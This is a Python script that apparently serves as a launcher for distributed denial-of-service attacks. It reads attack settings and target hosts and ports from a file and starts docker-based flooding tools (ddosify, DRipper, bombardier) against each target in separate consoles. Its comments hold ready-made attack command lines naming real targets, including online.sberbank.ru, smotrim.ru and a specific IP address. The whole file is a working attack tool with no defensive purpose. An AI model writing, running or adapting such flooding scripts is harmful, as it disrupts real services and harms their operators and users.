import subprocess
from subprocess import Popen

file_name = "..\\commands\\commands.txt"

file = open(file_name, "r")
number_of_parameters = 5
requests = 0
duration = 0
timeout = 0
turbo = 0

targets = []

for i, line in enumerate(file):
    line = line.replace(' ', '').replace('\n', '')
    if i < number_of_parameters:
        if line.startswith("Requests"):
            requests = line.split(':')[1]
        elif line.startswith("Duration"):
            duration = line.split(':')[1]
        elif line.startswith("Timeout"):
            timeout = line.split(':')[1]
        elif line.startswith("Turbo"):
            turbo = line.split(':')[1]
    else:
        current_line = line.split(':')
        targets.append([current_line[0], current_line[1].split(',')])

const_part1 = "docker run "

alpine1 = const_part1 + "--rm alpine/bombardier -c " + requests + " -d " + duration + "s -l "

ddos_ripper1 = const_part1 + "--rm -i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s "
ddos_ripper2 = " -t " + turbo + " -p "

ddosify1 = const_part1 + "--rm ddosify/ddosify ddosify -t "
ddosify2 = " -n " + requests + " -d " + duration + " -p "
ddosify3 = " -m PUT -T " + timeout

dripper1 = const_part1 + "--rm alexmon1989/dripper:1.0.1 -s "
dripper2 = " -p "
dripper3 = " -t " + duration


# # "docker run -ti --rm alpine/bombardier -c 1000 -d 10800s -l https://online.sberbank.ru/"
# # "docker run --rm -i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s 178.248.233.32 -t 135 -p 80"
# # "docker run -it --rm ddosify/ddosify ddosify -t smotrim.ru -n 5000 -d 6000 -p HTTPS -m PUT -T 5"
# # "docker run -it --rm alexmon1989/dripper:1.0.1 -s IP -p PORT NUMBER -t 5000"


for item in targets:
    for port in item[1]:
        if port == '80':
            Popen(f"{ddosify1}{item[0]}{ddosify2}HTTP{ddosify3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
        elif port == '443':
            Popen(f"{ddosify1}{item[0]}{ddosify2}HTTPS{ddosify3}", creationflags=subprocess.CREATE_NEW_CONSOLE)
        else:
            Popen(f"{dripper1}{item[0]}{dripper2}{port}{dripper3}", creationflags=subprocess.CREATE_NEW_CONSOLE)

